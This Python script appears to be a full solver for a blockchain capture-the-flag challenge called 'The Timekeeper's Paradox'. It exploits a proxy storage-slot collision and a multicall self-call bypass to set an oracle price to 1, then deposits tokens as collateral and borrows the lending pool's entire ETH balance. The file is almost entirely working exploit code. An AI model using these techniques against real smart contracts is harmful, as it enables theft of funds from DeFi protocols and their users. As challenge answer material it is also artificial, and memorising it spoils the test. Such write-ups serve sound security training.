#!/usr/bin/env python3
"""
The Timekeeper's Paradox — Full Working Solver
================================================
Exploits:
1. Storage Slot Collision: proxy.pendingAdmin (slot 2) collides with
   oracle.latestPrice (slot 2) when accessed via delegatecall
2. Multicall Self-Call Bypass: proxy.multicall() does address(this).call()
   which makes msg.sender == address(this), bypassing setPendingAdmin's self-call check
3. Oracle Price Manipulation: with manipulated price, deposit tokens → borrow all ETH

Usage:
    python3 solve.py <RPC_URL> <SETUP_ADDR> <PLAYER_KEY>
"""

import json, sys
from pathlib import Path
from web3 import Web3
from eth_account import Account

# ================================================================
# CONFIGURATION — Fill these from the CTF instance
# ================================================================
RPC_URL = ""        # Replace with instance RPC URL
SETUP_ADDR = ""     # Replace with Setup contract address
PLAYER_KEY = ""     # Replace with player private key

# ================================================================
# HELPERS
# ================================================================

def load_abi(path):
    """Load ABI from compiled JSON artifact."""
    data = json.loads(Path(path).read_text())
    return data["abi"]


# ================================================================
# MAIN SOLVER
# ================================================================
def solve(rpc_url, setup_addr, player_key):
    print("=" * 60)
    print("  THE TIMEKEEPER'S PARADOX — SOLVER")
    print("=" * 60)

    w3 = Web3(Web3.HTTPProvider(rpc_url))
    assert w3.is_connected(), "Failed to connect to RPC"
    player = Account.from_key(player_key)

    def send(tx_data):
        """Sign and send a transaction, return receipt."""
        tx_data["from"] = player.address
        tx_data["nonce"] = w3.eth.get_transaction_count(player.address)
        tx_data["gas"] = tx_data.get("gas", 5000000)
        tx_data["chainId"] = w3.eth.chain_id
        base = w3.eth.get_block("latest").get("baseFeePerGas", 1000000000)
        tx_data["maxFeePerGas"] = base * 3
        tx_data["maxPriorityFeePerGas"] = base
        signed = player.sign_transaction(tx_data)
        return w3.eth.wait_for_transaction_receipt(
            w3.eth.send_raw_transaction(signed.raw_transaction)
        )

    print(f"\n[+] Connected to chain {w3.eth.chain_id}")
    print(f"[+] Player: {player.address}")
    print(f"[+] Player ETH: {w3.from_wei(w3.eth.get_balance(player.address), 'ether')} ETH")

    # --- Load ABIs (extracted from Docker container or local build) ---
    # Try multiple paths for ABI files
    for base_dir in ["compiled", "../compiled", "/tmp/timekeeper_compiled", "out"]:
        p = Path(base_dir) / "Setup.sol" / "Setup.json"
        if p.exists():
            abi_dir = base_dir
            break
    else:
        print("[-] Could not find compiled ABIs. Extract from Docker container:")
        print("    docker cp <container>:/home/ctf/compiled ./compiled")
        sys.exit(1)

    setup_abi = load_abi(f"{abi_dir}/Setup.sol/Setup.json")
    token_abi = load_abi(f"{abi_dir}/TimekeeperToken.sol/TimekeeperToken.json")
    proxy_abi = load_abi(f"{abi_dir}/TimekeeperProxy.sol/TimekeeperProxy.json")
    lending_abi = load_abi(f"{abi_dir}/TimekeeperLending.sol/TimekeeperLending.json")

    setup = w3.eth.contract(address=setup_addr, abi=setup_abi)
    token_addr = setup.functions.token().call()
    proxy_addr = setup.functions.proxy().call()
    lending_addr = setup.functions.lending().call()

    token = w3.eth.contract(address=token_addr, abi=token_abi)
    proxy = w3.eth.contract(address=proxy_addr, abi=proxy_abi)
    lending = w3.eth.contract(address=lending_addr, abi=lending_abi)

    pool_eth = w3.eth.get_balance(lending_addr)
    player_tokens = token.functions.balanceOf(player.address).call()

    print(f"\n[+] Proxy:  {proxy_addr}")
    print(f"[+] Lending: {lending_addr}")
    print(f"[+] Pool ETH: {w3.from_wei(pool_eth, 'ether')}")
    print(f"[+] Player TKG: {w3.from_wei(player_tokens, 'ether')}")

    # ============================================================
    # STEP 1: Manipulate oracle price via multicall + storage collision
    # ============================================================
    print("\n" + "=" * 60)
    print("  STEP 1: Price Manipulation")
    print("=" * 60)
    print("[*] proxy.multicall([setPendingAdmin(address(1))])")
    print("[*] multicall uses address(this).call() → msg.sender = proxy")
    print("[*] setPendingAdmin requires msg.sender == address(this) → BYPASS!")
    print("[*] Writes 1 to proxy slot 2 = oracle.latestPrice via delegatecall")

    fake_price_addr = "0x0000000000000000000000000000000000000001"
    call_data = proxy.encode_abi("setPendingAdmin", args=[fake_price_addr])
    rcpt = send(
        proxy.functions.multicall([bytes.fromhex(call_data[2:])]).build_transaction({"gas": 500000})
    )
    print(f"\n[+] TX: {rcpt.transactionHash.hex()}")
    print(f"[+] Status: {'OK' if rcpt.status == 1 else 'FAILED'}")

    price = lending.functions.getOraclePrice().call()
    print(f"[+] getOraclePrice() = {price} (manipulated from normal value)")

    # ============================================================
    # STEP 2: Approve + Deposit tokens as collateral
    # ============================================================
    print("\n" + "=" * 60)
    print("  STEP 2: Deposit Token Collateral")
    print("=" * 60)
    print(f"[*] Depositing {w3.from_wei(player_tokens, 'ether')} TKG as collateral")

    rcpt = send(token.functions.approve(lending_addr, player_tokens).build_transaction({"gas": 100000}))
    print(f"[+] approve: {'OK' if rcpt.status == 1 else 'FAILED'}")

    rcpt = send(lending.functions.depositToken(player_tokens).build_transaction({"gas": 300000}))
    print(f"[+] depositToken: {'OK' if rcpt.status == 1 else 'FAILED'}")

    # ============================================================
    # STEP 3: Borrow all ETH from the pool
    # ============================================================
    print("\n" + "=" * 60)
    print("  STEP 3: Borrow All ETH")
    print("=" * 60)
    print(f"[*] With price={price}, each TKG ≈ 1 ETH of collateral value")
    print(f"[*] 10,000 TKG → borrowing power >> {w3.from_wei(pool_eth, 'ether')} ETH")

    rcpt = send(lending.functions.borrowETH(pool_eth).build_transaction({"gas": 500000}))
    print(f"\n[+] TX: {rcpt.transactionHash.hex()}")
    print(f"[+] Status: {'OK' if rcpt.status == 1 else 'FAILED'}")

    # ============================================================
    # VERIFY
    # ============================================================
    print("\n" + "=" * 60)
    print("  VERIFICATION")
    print("=" * 60)
    new_pool = w3.eth.get_balance(lending_addr)
    print(f"[+] Pool ETH remaining: {w3.from_wei(new_pool, 'ether')}")
    print(f"[+] Player ETH: {w3.from_wei(w3.eth.get_balance(player.address), 'ether')}")

    solved = setup.functions.isSolved().call()
    print(f"[+] isSolved(): {solved}")

    if solved:
        print("\n[+] ✅ CHALLENGE SOLVED!")
    else:
        print("\n[-] ❌ Not solved yet")

    return solved


# ================================================================
# ENTRY POINT
# ================================================================
if __name__ == "__main__":
    if len(sys.argv) >= 4:
        rpc = sys.argv[1]
        setup = sys.argv[2]
        key = sys.argv[3]
    else:
        rpc = RPC_URL
        setup = SETUP_ADDR
        key = PLAYER_KEY

    if not setup or not key:
        print("Usage: python3 solve.py <RPC_URL> <SETUP_ADDR> <PLAYER_KEY>")
        print("   Or: Set RPC_URL, SETUP_ADDR, PLAYER_KEY at the top of the file")
        sys.exit(1)

    solve(rpc, Web3.to_checksum_address(setup), key)
